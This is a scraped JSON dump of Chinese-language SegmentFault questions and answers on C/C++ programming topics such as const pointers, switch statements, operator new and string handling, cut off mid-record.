      "favourite": "0",
      "glance": "1.6k",
      "tags": [
        "c",
        "c++",
        "内存"
      ],
      "time": "2015-02-03",
      "title": "C-Segmentation fault (core dumped)",
      "url": "https://segmentfault.com/q/1010000002533735"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000002538579\">\n<p>为了节约精力，我想针对每一个项目，准备一个 Docker Image 用来编译。这样，如果有人问我 \"如何编译xxx\" 我可以直接把链接丢给他</p>\n<p>现在，我写的 Dockerfile 是：</p>\n<pre><code>FROM fedora:21\n\nMAINTAINER Zhenbo Li\n\nRUN yum groupinstall buildsys-build -y\nRUN yum install yum-utils -y\n\nRUN yum-builddep mingw32-wine-gecko -y\n\nENV SHELL=/bin/bash\n\n</code></pre>\n<p>使用方法是</p>\n<pre><code>$ cd /home/lizhenbo/src\n$ git clone git://git.code.sf.net/p/wine/wine-gecko wine-wine-gecko\n$ docker run -it -v /home/lizhenbo/src:/home/lizhenbo/src endle/build_wine_gecko\n# cd /home/lizhenbo/src/wine-wine-gecko\n# SHELL=/bin/bash wine/make_package\n# exit\n$ sudo chown -R lizhenbo wine_gecko-2.36-beta1-x86\n</code></pre>\n<p>程序可以正常编译，但生成的目标文件 (~/src/wine_gecko-2.36-beta1-x86) 是属于 root 的，所以我最后需要用 chown 修改。感觉这么做很麻烦，请问大家有解决的办法吗？</p>\n</div>",
      "favourite": "0",
      "glance": "1.3k",
      "tags": [
        "docker",
        "c++"
      ],
      "time": "2015-02-05",
      "title": "使用 Docker 搭建编译环境后生成的文件属于root",
      "url": "https://segmentfault.com/q/1010000002538579"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004692394\">\n<pre><code class=\"py\">while True:\n    pass</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004692931\">\n<pre><code>\"use strict\";\nconst os = require(\"os\");\nconst restMemory = 0.1;\nlet largeBuffer = [];\nwhile (true) {\n    if (parseFloat(os.freemem() / os.totalmem()) &gt; restMemory) {\n        largeBuffer.push(new Buffer(1024));\n    } else {\n        continue;\n    }\n}</code></pre>\n<p>专门为你写了一段代码，<code>nodejs</code>可以瞬间让你的内存剩余到你指定的<code>restMemory</code>值的位置。特别少的时候会很卡，小心使用。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004695663\">\n<p>你们都说错了！！！！！！！！</p>\n<p>讲真 只要安装</p>\n<p>1.百度全家桶*<br>2.腾讯电脑管家<br>3.360安全卫士</br></br></p>\n<p>啧啧 然后重启一下电脑 尽情体验卡顿的感觉</p>\n<p>*未成年人请勿模仿 出现意外后果概不负责</p>\n<hr>\n<p>233 有人踩了一下 难道是认为百度可以提速</p>\n</hr></div>",
      "attention": "14",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004691718\">\n<p>我是windows桌面软件的开发者，我发现了一个问题，如果windows几天不关机，在运行一些软件，会有些慢，即使用了清理释放的相关软件，也没很大作用。重启后即可消失。所以我想在开机的时候进入这种变慢环境，进行优化调试。</p>\n</div>",
      "favourite": "2",
      "glance": "1.2k",
      "tags": [
        "windows",
        "python",
        "c#",
        "c",
        "c++"
      ],
      "time": "3-26",
      "title": "如何让电脑变卡？",
      "url": "https://segmentfault.com/q/1010000004691718"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000005067857\">\n<ol>\n<li><p>从编译器的角度来解释，编译器不允许const指针赋值给非const指针，因此可知const指针不能隐式转换为非const指针。</p></li>\n<li><p>由1知，const指针q加上任意常数n，即q+n仍然为const指针类型（因为const指针允许本身发生移动或者改变，即q=q+n是允许的），而q[n]=*（q+n），因此一个const指针访问的整个数组都是不可修改的只读的值。</p></li>\n</ol>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005060005\">\n<p>这里的Const确保函数内这个指针指向不变，始终指向数组首地址以及这个地址只读</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000005061416\">\n<p>const int 限定的是数组元素的类型，表示元素的值只读,所以是整个数组。其实 const 只是语法限定只读，实际内存数据仍然可写。  arr 还是一个指针变量，可以赋值，但只能指向 const int 类型的地址。<br>使用强制类型转换，仅为演示，不建议乱用强制转换，除非自己清楚。<br>参考代码如下：</br></br></p>\n<pre><code>void al(const int arr[])\n{\n       const int* const pci = arr;\n    arr = pci;     // 可以\n    // pci = arr;  // 不可以, 因为 const pci\n    //*pci = 3;       // 不可以, 因为 const int*\n\n    // arr[0] = 0; // 不可以\n\n    // C 可以, 编译警告\n    // C++ 不可以\n    // int *pa = arr; \n    // pa[0] = 9;  \n\n    const int *p = &amp;arr[0];\n    arr = p;\n    printf(\"arr[0]: %d\\n\", arr[0]);\n\n    const int i = 7;\n    printf(\"i: %d\\n\", i);\n    \n    void *pvi = (void *) &amp;i;\n    int  *pi  = (int *) pvi;\n    // printf(\"*pi: %d\\n\", *pi);\n    *pi = 5;\n\n    printf(\"i: %d\\n\", *pi);\n}\n  \n</code></pre>\n</div>",
      "attention": "7",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005059738\">\n<p>1.void a(const int arr[], int n);<br>arr既然作为一个形式参数，退化为一个指针，指向数组第一个元素，那为什么const还是作用于整个数组，而不仅仅是第一个元素</br></p>\n</div>",
      "favourite": "0",
      "glance": "359",
      "tags": [
        "c",
        "c++"
      ],
      "time": "5-4",
      "title": "关于const的一个问题",
      "url": "https://segmentfault.com/q/1010000005059738"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000005151704\">\n<p>这里是char类型，不是常量字符串，首先根据优先级，会先计算后面的'0'+'a'，对于char类型，相加还是一个char类型('a')，所以+=char类型，实际只append了一个字符。</p>\n<pre><code>    ¦ /**\n    ¦  *  @brief  Append a character.\n    ¦  *  @param c  The character to append.\n    ¦  *  @return  Reference to this string.\n    ¦  */\n    ¦ basic_string&amp;\n    ¦ operator+=(_CharT __c)\n    ¦ {\n    this-&gt;push_back(__c);\n    return *this;\n    ¦ }</code></pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005157493\">\n<h1>发代码的时候请不要发截图。</h1>\n<p>这是因为（1）运算符优先级不同，<code>+</code>高于<code>+=</code>；（2）加法的操作数（operand）不同。</p>\n<pre><code>s += '\\0' + 'a';</code></pre>\n<p>等价于</p>\n<pre><code>s += ('\\0' + 'a');</code></pre>\n<p>类似于</p>\n<pre><code>s = s + ('\\0' + 'a');</code></pre>\n<p>等价于</p>\n<pre><code>char tmp = '\\0' + 'a';\ns += tmp;</code></pre>\n<p>两个<code>char</code>类型的变量（字符）做加法，相当于把两个字符对应的数值相加，所以<code>'\\0'+'a'</code>等价于<code>0 + 97</code>，其结果为<code>97</code>即字符<code>'a'</code>。</p>\n<p>而</p>\n<pre><code>s += '\\0';\ns += 'a';</code></pre>\n<p>类似于</p>\n<pre><code>std::string tmp = s + '\\0';\ns = tmp + 'a';</code></pre>\n<p><code>std::string</code>与<code>char</code>做加法，相当于把字符附加到字符串末尾，所以<code>s + '\\0'</code>表示在字符串末尾增加一个<code>'\\0'</code>字符。</p>\n<p>至于<code>str += 'a' + 'a';//报错</code>的警告就是 <a href=\"/u/suijing\">@碎镜</a> 解释的原因，即字符溢出。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000005149679\">\n<p>这是因为：前者先做'\\0'+'a'得到'a'，所以实际上只是append了一个字符</p>\n<p>而后者append了两个字符。</p>\n<p>其实两者的输出应当是：</p>\n<pre><code>ABCDa5\nABCD\\0a6\n</code></pre>\n<p>因为\\0在终端中不显示，所以你看不到</p>\n<p>你贴的那个新产生的错误的原因是'a' = 97<br>97 + 97 = 194<br>超出了0-127这个ascii字符的范围，所以从数值隐式转换成字符报warning了</br></br></p>\n</div>",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005149483\">\n<html><body>\n<p><img data-src=\"/img/bVvKt4\"/></p>\n<p>str.size() 输出结果不一样</p>\n<pre><code>str += 'a' + 'a';//报错</code></pre>\n<p><img data-src=\"/img/bVvMpG\"/></p>\n</body></html>\n</div>",
      "favourite": "1",
      "glance": "485",
      "tags": [
        "c++",
        "string"
      ],
      "time": "5-18",
      "title": "C++中string类size",
      "url": "https://segmentfault.com/q/1010000005149483"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005865818\">\n<html><body>\n<p>如果是一个非常大的N &lt;10000000 那么计算出来的N！也是非常大的，现在只需要知道最高位的数字。<br>通过斯特林公式可以计算。<br>特林斯公式：<br><img data-src=\"/img/bVyL76\"> （公式1）<br>如下是算法：</br></img></br></br></br></p>\n<pre><code>result = 0.5* log(2*PI*(double)n)/log(10.0) + (double)n* log((double)n/E)/log(10.0);\nresult -= (int)result;\nfirst_number = exp(result * log(10.0));\n</code></pre>\n<p>以上算法代码计算通过公式表示：<br><img data-src=\"/img/bVyQWH\"> （公式2）<br>目前已知通过如下计算可以得到最高位：<br><img data-src=\"/img/bVyQXd\"> （公式3）<br>剩下的就是求N！，虽然N！可以通过特林斯计算，但是计算结果非常大。计算机直接计算会溢出结果，如下执行结果：<br><img data-src=\"/img/bVyQYb\"><br>可以看出当执行到180的时候结果都已经溢出。<br>原因应该是在计算N！ 的时候结果直接存储在计算机导致空间不足。<br>我所不明白的是为什么（公式2）的算法就可以直接计算出结果不溢出，且正确（当然数字过小的话也会有错误，比如0,1,2,3,7,8结果将不正确）。</br></br></br></img></br></br></img></br></br></img></br></p>\n</body></html>\n</div>",
      "favourite": "0",
      "glance": "151",
      "tags": [
        "c",
        "c++",
        "数学",
        "数学题"
      ],
      "time": "7-4",
      "title": "特林斯公式如何计算N！ 的最高位",
      "url": "https://segmentfault.com/q/1010000005865818"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000097312\">\n<p>针对跨语言通讯。貌似有些RPC框架，如ICE，THRIFT。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000210933\">\n<p>使用google protocol buffer 定义消息，支持C++，Java，Python，还有很多其他语言的第三方插件。例如C#，Object-C，Flex，PHP等都支持。\n如果是自己写编解码，在Java中要特别注意处理无符号数（或者干脆避免使用unsigned int，直接使用int），还有字符也不一样，java的字符是unicode编码，而C、C++是ascii编码。。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000096485\">\n<p>这个玩意貌似叫protoBuffer，比较好的办法是，你得有一个第三方的描述性文件，描述这个结构，比如</p><pre>&lt;info type=\"info\"&gt;\n    &lt;id  type=\"int32\" /&gt;\n    &lt;name type=\"string\" /&gt;\n&lt;/info&gt;</pre><p>通信的两端必须得理解这个结构的，然后在传输的时候，序列化一下，在按照一定的规则读一下就OK。你可以看看google关于此方面的资料，你搜那个protoBuffer就是了。</p>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094666\">\n<p>我相信这个问题以前在csdn上也有人问过.<br/>\nc++ 结构体</p><pre>struct Info { \n    int id;\n    char name[20];\n};</pre><p>java Bean类</p><pre>class Info {\n    private int id;\n    private String name;\n    //Getter Setter\n}</pre><p>一个简单的想法就是<br/>\njava 客户端 读取发送过来的字节数据 然后针对性的做大小字节变化，并取出多少字节复制给id或name<br/>\n我主要想询问下有没有一种比较好直接能够read/Write Object的解决方案</p>\n</div>",
      "favourite": "1",
      "glance": "9.3k",
      "tags": [
        "c++",
        "socket",
        "通信",
        "java-ee"
      ],
      "time": "2011-06-24",
      "title": "java 与 c++ 的socket通信过程中，如何将c++发送的结构体直接转成java bean类",
      "url": "https://segmentfault.com/q/1010000000094666"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000096638\">\n<p>呵呵，这是一个相当有趣的问题。</p><p>在我看来，switch的确在实质上跟if else if 完全一样的效果，不过在很多情况下，使用switch要比if else方便不少</p><p>比如经典的值等分支，匹配一些状态常量的时候，比if else结构方便许多，不用反复写xx == yy</p><pre>switch (param) {\n  case STATUS_ONE:\n    ...\n    break;\n  case STATUS_TWO:\n    ...\n    break;\n  default:\n    ...\n}</pre><p>vs</p><pre>if (param == STATUS_ONE) {\n  ...\n} else if (param == STATUS_TWO) {\n  ...\n} else {\n  ...\n}</pre><p>当然，switch在非值等分支的时候也不是那么没用，比如经典的打分评级，也可以这么写：</p><pre>switch (true) {\n  case score &lt; 60:\n    return 'D';\n  case score &lt; 70:\n    return 'C';\n  ...\n}</pre><p>看上去也会相当的清晰。</p><p>总之我认为switch是一个经常被小看的语法结构，用得好的话，会很省事。</p><p>另外如果代码里面有很多平级的if却没有else，其实没有break的switch也是一个不错的选择，比如拼sql的时候：</p><pre>switch (true) {\n  case id &gt; 0:\n    query-&gt;addWhere('id = ?', id);\n  case (bool)name:\n    query-&gt;addWhere('name = ?', name);\n  ...\n}</pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000096636\">\n<p>本来就是如此，switch就是让你更清晰一点，不然到处的if else会让你烦死的。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000096639\">\n<p>在大多数情况下，switch的性能不会比if else低。<br/>\n在某些特定情况下，编译器能对switch进行优化。比如说：<br/>\n1. 不按顺序比较，而是构造一个二分查找树(binary decision tree), 这样子比较的平均次数就会下降。<br/>\n2. 可以做个跳转表(jump table)这样子就不许要任何比较了。比如如下的代码。</p><pre>int main(int argc, char* argv[])\n{\n\tint j = 0;\n\tint n;\n\tcin&gt;&gt;n;\n\tswitch(n)\n\t{\n\tcase 1: j = 1; break;\n\tcase 2:\tj = 2; break;\n\tcase 3:\tj = 3; break;\n\tcase 4:\tj = 5; break;\n\tdefault:j = 6;\n\t}\n\tcout&lt;&lt;j&lt;&lt;endl;\n\treturn 0\n}</pre><p>其在VS2008编译器下产生的代码如下</p><pre>switch(n)\n00401011  mov         eax,dword ptr [esp] \n00401014  dec         eax  \n00401015  cmp         eax,3 **&lt;==这里只比较了一次，看看是否是default分支**\n00401018  ja          0040103D \n0040101A  jmp         dword ptr [eax*4+00401064h] **&lt;==这里直接用了一个跳转表,没有比较语句**\n\t{\n\tcase 1: j = 1; break;\n00401021  mov         eax,1 \n00401026  jmp         00401042 \n\tcase 2:\tj = 2; break;\n00401028  mov         eax,2 \n0040102D  jmp         00401042 \n\tcase 3:\tj = 3; break;\n0040102F  mov         eax,3 \n00401034  jmp         00401042 \n\tcase 4:\tj = 5; break;\n00401036  mov         eax,5 \n0040103B  jmp         00401042 \n\tdefault:j = 6;\n0040103D  mov         eax,6 \n\t}\n\tcout&lt;&lt;j&lt;&lt;endl;\n00401042  mov         ecx,dword ptr ds:[0040203Ch] \n00401048  push        ecx  \n00401049  mov         ecx,dword ptr ds:[0040204Ch] \n0040104F  push        eax  \n00401050  call        dword ptr ds:[00402038h] \n00401056  mov         ecx,eax \n00401058  call        dword ptr ds:[00402040h] \n\treturn 0;</pre>\n</div>",
      "attention": "1",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000094733\">\n<p>刚学完c++，觉得switch语句除了条理清晰些，没有别的太大优势，小弟不才，还望指教。</p>\n</div>",
      "favourite": "1",
      "glance": "9.6k",
      "tags": [
        "c++"
      ],
      "time": "2011-07-06",
      "title": "Switch语句比起if else语句有哪些优势？",
      "url": "https://segmentfault.com/q/1010000000094733"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000097632\">\n<p>在进程空间没有足够大的连续内存块时，new会默认调用new_handler抛出异常。如果你要改，可以通过注册set_new_handler这个回调函数。</p><p>我觉得这是个异常，所以还是要捕捉的，就捕捉new就可以了。如果你觉得每次都写代码麻烦，就自己包装一下</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000097651\">\n<p>new分配内存失败，默认是返回bad_alloc.<br/>\n或者在编译的时候选择禁止异常</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000097956\">\n<p>异常在不发生的时候，是几乎没有额外代价的，而且像内存用尽这样的异常，本来就是应该在应用程序最高层处理的，因为除了这样，也没别的什么事情好做。<br/>\n总之，在整个应用程序最高层处理 bad_alloc 这样的异常，远远好于每次去检查 new 的结果是否为真。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095220\">\n<p>开发环境 VS2008<br/>\n想问下如果new的时候内存不够是是会返回NULL呢还是会直接抛出异常<br/>\n因为延续以前写C的习惯，malloc完了以后检查返回值，为空怎么处理，不为空怎么处理<br/>\n这样每个new的位置都会多出一堆代码<br/>\n最近看到貌似默认的new是直接抛出异常的？如果不希望抛出异常是用new(nothrow)<br/>\n那正常情况下应该不需要处理new的返回啦？捕获这个异常然后提示内存不足把程序退出就可以了？<br/>\n那么这个捕获放哪？把整个程序都放在try里面？会不会影响程序效率？<br/>\n想问下大家一般都怎么处理这个问题的。</p>\n</div>",
      "favourite": "0",
      "glance": "5.1k",
      "tags": [
        "c++",
        "new"
      ],
      "time": "2011-12-04",
      "title": "C++ new 返回空的处理",
      "url": "https://segmentfault.com/q/1010000000095220"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000098433\">\n<p>不管MFC的好坏.这本书是本好书.</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000098435\">\n<p>MFC是垃圾技术,书是很好的书。对于技术培养的实用性来说,还是很大的。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000098426\">\n<p>反正别学MFC，过时的东西。<br/>\n1、C++基础打好：对象，继承，多态等<br/>\n2、算法基础打好<br/>\n3、设计模式基础打好</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095790\">\n<p>现在刚开始接触c++。我不知道，该怎么规化一下自己的学习路线？目标是软件开发方向。另外，请讲一下侯俊杰《深入浅出MFC》这本书现在的使用价值如何？Thank you for your answer patiently !</p>\n</div>",
      "favourite": "0",
      "glance": "3.9k",
      "tags": [
        "c++"
      ],
      "time": "2012-05-29",
      "title": "亲，请讲一下侯俊杰《深入浅出MFC》这本书现在的使用价值如何？",
      "url": "https://segmentfault.com/q/1010000000095790"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000139312\">\n<p>太小题大作了。读取前3个数字:<br/>\n1. 如果3个数字不都一样，给出不一样的那个，结束。<br/>\n2. 如果都一样=X，整个数组扫过去，找到一个不等于X的数字，结束。</p><pre>int foo(int x[], int n)\n{\n    int a = x[0], b = x[1], c = x[2];\n    if (a == b &amp;&amp; b == c)\n        for (int i = 3; i &lt; n; i++)\n            if (x[i] != a)\n                return x[i];\n    if (a == b) return c;\n    if (a == c) return b;\n    return a;\n}</pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000117030\">\n<p>如果能够根据前几个数字判断出来不变的数字是123，那可以对整个序列求和对123取模，余数应该就是那个不一致的数，但也仅限于那个不一致的数字只出现一次。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000117018\">\n<p>问题在于在<strong>while循环</strong>过程中我忘记了给<strong>high--</strong>和<strong>low++</strong>，然后出现了死循环。<br/>\n这个问题明显告诉我们它不需要排序，只需要找出其中的坏小子就可以啦。<br/>\n比较简单的做法是<strong>data.unique()</strong>,然后比较前面三个元素。<br/>\n当然，我写一篇文章记录下来了。<a href=\"http://honwhy.ixiezi.com/?p=265\" rel=\"nofollow\" target=\"_blank\" title=\"http://honwhy.ixiezi.com/?p=265\">http://honwhy.ixiezi.com/?p=265</a> 有兴趣的可以看一下。</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000116871\">\n<p>在一堆数字中找出和其他数字不同的数字，如123,123,14,123,123,123这堆数字中找出14来，写下算法思路和时间复杂度，要求写核心代码和不能使用辅助空间。</p><pre>#include &lt;iostream&gt;\n#include &lt;vector&gt;\n#include &lt;cstdlib&gt;\nusing namespace std;\nint main() { \n\n    vector&lt;int&gt; data;\n\tcout &lt;&lt; \"Enter same numbers \"\n\t\t\t&lt;&lt; \" and a different one( negative to be end) :\" &lt;&lt; endl;\n\tint value;\n    while( cin &gt;&gt; value &amp;&amp; value &gt; 0 ) {\n        data.push_back(value);\n    }\n    int unique_value;\n    int size = data.size();\n    if(data[0] != data[1] ) {\n        if( data[0] != data[2]) {\n            unique_value = data[0];\n        }\n        else  {\n            unique_value = data[1];\n        }\n       cout &lt;&lt; \"found the unique number: \" &lt;&lt; unique_value &lt;&lt; endl;\n       exit(0);\n    }\n    int low = 2;\n    int high = size-1;\n    while( high &gt; low )  {\n         if( data[high] != data[low] ) {\n            //其中必有一个是不同的，只要和data[0]就能得到结果\n            if( data[high] != data[0] ) {\n                unique_value = data[high];\n            } \n            else {\n                unique_value = data[low];\n            }\n            break;\n         }\n    }\n    if( high == low ) \n   //low和high相等，data[high]没有和任何其他元素比较过\n    unique_value = data[high];\n    cout &lt;&lt; \"found the unique number: \" &lt;&lt; unique_value &lt;&lt; endl;\n    return 0;\n}</pre><p>这段代码有什么问题吗？<br/>\nBUG已经找出来了，可以看我的答案。</p><ins><em>分割线 </em></ins><p>但是或许表达的原因，题意不甚清楚，所以这里补充说明：</p><blockquote>1.不一致的数字只出现一次，即所有数字的情况为：N个value_1和一个value_2，value_1不等于value_2；<br/>2.为了方便输入数据演示，我们假设数字不能为负数；<br/><br/>大家都说得很好: unique()是标准库中一个算法，具体的效率我不是很懂，而且对于这道题目来说，有一个不好的地方是，破坏了数组的结构，不能回答类似<strong>“唯一元素的序号”</strong>的问题； 这个小问题已经没有多少可以继续探讨的内容了，但我觉得应该加上一个要求——<strong>不能破坏数据结构</strong>。</blockquote>\n</div>",
      "favourite": "5",
      "glance": "4k",
      "tags": [
        "c++",
        "算法"
      ],
      "time": "2012-09-07",
      "title": "如何在一堆数字中找出与其他数字不同的一个？",
      "url": "https://segmentfault.com/q/1010000000116871"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000132882\">\n<p>指针类型有重载了-&gt;操作符  所以对于指针 使用-&gt;是没问题的，对象则用.操作符。</p><p>当然对象如果重载了-&gt;也是可以用-&gt;的 就看你自己有没有去实现他了  没有的话 用肯定是不行的。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000124013\">\n<p>a-&gt;someMethod()一般情况下等价于(*a).someMethod()<br/>\n.用于实例上，-&gt;用于指针上。。。</p><p>但仅仅是一般情况。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000123899\">\n<p>基本的语法知识，-&gt;是用在指针类型的类实例的。补充下，第二种情况下也仅仅是编译能过吧，运行肯定就segmentfault了，原因是这时候并不会调用构造函数，当你用指针的时候一定要new一个对象，好了不多说了，在机场拿个抓机回复很累呀呵呵</p>\n</div>",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000123893\">\n<pre>#include &lt;iostream&gt;\nusing namespace std;\nclass Person{\n    public:\n    Person(){\n    };\n    void speak(){\n    cout&lt;&lt;\"Helloworld\"&lt;&lt;endl;\n};\n};\nint main()\n{\n    Person p;\n    p-&gt;speak(); //error\n    p.speak();\n    return 0;\n}</pre><p>为什么这里面会出现错误？也就是说在什么情况下使用 <cite>-&gt;</cite> ?</p><p>如果把里面的代码换成：</p><pre>Person *p;\n    p-&gt;speak();//right   这里面是不是默认实例化了一个类？\n    p.speak();//error\n    return 0;</pre><p>求解惑，求指导。</p>\n</div>",
      "favourite": "0",
      "glance": "12.5k",
      "tags": [
        "c++"
      ],
      "time": "2012-10-01",
      "title": "C++中类的方法的调用 . 和->的区别",
      "url": "https://segmentfault.com/q/1010000000123893"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000131277\">\n<p>例如下面的例子，能否(如何)区别fn1的两次调用。（与Common Lisp中的函数可选参数相似）<br/>\n我刻意传递了与默认参数相同的值，防止仅仅使用比较值的方法区分。<br/>\nLinux系统，编译器为g++ 4.7.2。可以利用编译器特性。</p><pre>#include &lt;iostream&gt;  \nvoid fn1(int a,int b=10);  \n  \nvoid fn1(int a,int b)  \n{  \n    std::cout&lt;&lt;\"a=\"&lt;&lt;a&lt;&lt;\" b=\"&lt;&lt;b&lt;&lt;std::endl;  \n}  \n  \nint main(void)  \n{  \n    fn1(1);  \n    fn1(1,10);  \n    return 0;  \n}</pre>\n</div>",
      "favourite": "0",
      "glance": "3.2k",
      "tags": [
        "c++",
        "linux",
        "gnu"
      ],
      "time": "2012-10-23",
      "title": "怎么判断C++函数默认参数在调用时是否被赋值(还是使用了默认参数)",
      "url": "https://segmentfault.com/q/1010000000131277"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000134324\">\n<p>补充一下 @Henry 的答案<br/>\n字符串数组和指针，虽然两个很相似，数组可以在使用时<strong>退化</strong>成指针使用，但是两个概念上就不一样。<br/>\n关键的一点在于，指针存放的是一个<strong>地址</strong>。<br/>\n举个例子：</p><pre>const char str[] = \"segmentfault.com\";\nconst char *str_ptr = \"segmentfault.com\";\n\n// sizeof(str) == 17\n// sizeof(str_ptr), 平台相关, x86的目标文件一般为4(32位), x86_64的目标文件一般为\n//   8(4位)</pre><p>EDIT:</p><p>利用这点可以在<strong>编译时</strong>就确定出字符串的长度。</p><p>理解了指针是<strong>地址</strong>之后，下面的错误就不会犯了：</p><p>define.c</p><pre>// 定义该字符串常量\nconst char str[] = \"segmentfault.com\";</pre><p>main.c:</p><pre>// 错误的声明\nextern const char *str;\n// 正确的声明\n//extern const char str[];\n\nint main()\n{\n    // 产生段错误\n    // 原因: str本来是数组，但是声明为了指针\n    //   假设目标文件是32位 x86 小端格式\n    //   则实际访问的错误地址是 0x6d676573 (刚好就是segm这4个字符的ASCII码)\n    printf(\"%s\\n\", str);\n    return 0;\n}</pre>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004348452\">\n<p>由于历史原因，c++兼容c的字符串。c风格字符串使用<code>char[]</code>或者<code>const char *</code>来表示。字符串字面值也被编译器推导为<code>const char *</code>。</p>\n<p>windows环境下，字符串编译后被存在<code>.rsrc</code>区段中（区段是可以随意改名的，不同编译器实现也可能不同，可以打开peid去查）。这个区段是只读的，你如果强行写入程序会崩溃，所以为了保险起见给你<code>const char *</code>。</p>\n<p>但是现代的c++编程不提倡用c风格字符串（就像obj-c也不提倡使用c风格字符串，而是<code>NSString</code>），所以你只要记住上面那一点，并且使用<code>std::string</code>就好了。遇到c风格字符串，如果你要使用，应该马上用<code>string</code>的构造函数转换为<code>string</code>。</p>\n<p>记住，你写的是c++，不是c！</p>\n<p>构造函数调用有两种形式，一种是函数形式，比如<code>string url(\"segmentfault.com\")</code>。但是，特别地，如果构造函数只有一个参数，可以写成赋值形式，即：</p>\n<pre><code>#include&lt;string&gt;\nstring url = \"segmentfault.com\";</code></pre>\n<p>只要这是对象的初始化，而且存在相应的构造函数，就会编译成构造函数的调用。而不是先创建<code>string</code>，再调用<code>operator =</code>。上面那句话的实际作用是拿<code>const char *</code>来构造<code>string</code>。</p>\n<p>或者如果你想让编译器推断为<code>string</code>类型，在它后面加个s。</p>\n<pre><code>auto url = \"segmentfault.com\"s;</code></pre>\n<hr>\n<p>你如果用<code>char []</code>保存字符串，那它是存在栈上的。</p>\n<p>是因为原生数组的名字，可以被编译器推导为低一级的指针，指向数组起始位置，比如<code>char[]</code>在使用时会被当作<code>char *</code>。</p>\n<p><code>char[]</code>和别的数组不同的地方还在于可以用字符串字面值初始化。</p>\n<p>如果你这样写：</p>\n<pre><code>char str[] = \"segmentfault.com\";</code></pre>\n<p>就相当于</p>\n<pre><code>char str[] = {'s','e','g','m','e','n','t','f','a','u','l','t','.','c','o','m','\\0'};</code></pre>\n</hr></div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000134285\">\n<p>先说说这几个例子的区别吧：<br/>\n1、</p><pre>#include&lt;string&gt;\nstring url = “segmentfault.com”;</pre><p>url是一个string对象。为了更加容易地操纵字符串，cpp为我们定义了一个string类(string并不是cpp的关键字)，你可以通过它来定义字符串对象，然后通过调用它的方法来获取该字符串的信息，例如获取它的长度：<br/>\nurl.length()<br/>\n又或者对它进行操纵，例如拼接：</p><pre>string scheme = “http://”\ncout &lt;&lt; scheme+url &lt;&lt; endl; //输出http://segmentfault</pre><p>2、<br/>\n下面的三种写法都可以看作是一种：</p><pre>const char* url = “segmentfault”;</pre><p>因为 const char url[]（字符数组），数组名url在编译时会被隐式转为为指针char*，指向字符串的首个字符's'。至于*号的位置，有人喜欢把它放到靠近类型，有人喜欢把它放到靠近变量名，这里有一个关于这个问题讨论的topic</p><p><a href=\"http://topic.csdn.net/u/20101117/10/fdc8d881-fd87-46fb-9d82-f0a49109ef6a.html\" rel=\"nofollow\" target=\"_blank\" title=\"http://topic.csdn.net/u/20101117/10/f...\">http://topic.csdn.net/u/20101117/10/f...</a></p><p>又因为是常量字符串，所以你不能对它进行修改</p><pre>url[0]='x';//错误，不可以进行修改,就算没有用const来修饰，也不可以</pre><p>但是在string中却可以</p><pre>string url = “segmentfault.com”;\nurl[0] = 'x';//OK</pre><p>这是因为string为我们承担了管理内存的任务。如果你想要对它进行拼接，你需要自己写一个函数，又或者调用cstring库中的strcat或strncat函数。</p><p>在c/cpp中，*有两种作用，一种是用来定义指针类型，char* 就是字符指针。另外一种就是取值，取指针指向的值，想上面所说的</p><pre>const char *url = “segmentfault”;</pre><p>url是指向字符串的首个字符，所以你对指针url取值，得到的就是字符's'</p><pre>cout 